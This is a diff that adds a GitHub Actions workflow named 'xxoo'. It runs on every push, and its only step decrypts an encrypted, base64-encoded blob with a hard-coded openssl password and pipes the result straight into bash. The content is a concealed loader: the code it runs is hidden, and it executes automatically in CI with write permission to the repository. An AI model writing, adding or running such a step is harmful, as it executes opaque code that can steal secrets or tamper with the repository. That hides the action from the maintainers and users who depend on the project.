@@ -1,0 +1,14 @@
+name: xxoo
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+      - name: xxoo
+        run: |
+          echo "U2FsdGVkX18sIO/PvMQ8mz8yrXmhl2FeC6b9KceVdZHFLks/R1MoIw82K7AUy8N+kZHKszTx1qsgq/BqTXZT3320iz/csCYqMYmChkyZckZ+uhJeyg5ck3gTHdgd9j5tQEJSK/9LPWZpqWHdCxRBQ+Iiw9OKJxFDhs+a2DUZiTf7NJAS0H/Y4fG0Mj8UMyJ4ec721Fr7ryiSDJ2+A6PbwifgzmBQoJkDqz/VhwW/KnLe4j/r0qn8/HWYq+k2tXAvZqABsbGQQ7IdsgDqNv0ixdITBGsvCZP1Tx4mWO62IYspkGGl2S9niiv36o3tyNfxBwvO5I0KMvim1/ZEy2j8rgO+UD9zejJhm++X7Mo7/R8TBensVvipJsqnTx0p/ajMTHWoly6DGyw1RJuZFO7IPAJ7mD4+2DKG6Vy2F4PQWiwqDsxZGGZNM20gJ7k//V/ggkNRVQkKC7/6QS3uW7Gllg8AUPvcVtEbRp9eY5IJfwBqBJFCzDLRXq5ZW9tteXlzSq6eUOZG/VET3uI9T0GrmWiNloDH9bgXhzIXpCS70md1YYK2gzsIOtu3a1xDeGeUv770Phqqm9H9EoCrn/y2OHxZL71fMSGwaApI9n8PIzgGVFXp/KiZ7zWym2ZZ+SQjA/JUAze5qPM4qEf6OBWmdwTL/LfMAAbZC8tPH+SrOP26bSQHMgCo+jV8ApF57RpxL4XmiX1BfSeHIP5RS1pjPHSIm8XJAlhhAeiDJMwbP2dfwLdv2Z0yozXbjToXewxkSwkLuz8nmLrxzj15OLHx+Qq2OyWYI61PtTY6eX9rrbVQ+r6cLayTda/sk+XWMURHIMAt0fG2brZxjHlEGOZkkcrgbgpSlme1e+cxTEixW9sApfnEOmkm6EEUPfZ4yZQ0vOD2Vg+Q2n8ZUKU0NzO0TIEXPLL9Y8gxGKKHX77l/AgucSJ3xWzF0sJ1KAXJ7CHmyXuoDhHlESYu3K1lQBr82IHSsAzpXMFoF2YV48W+9AmmrxjdhS9jZh0W2a4eVndxHeBapLDCosZ1hEhI+/sD6Q==" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:7uhfudnfud909~~23 | /bin/bash
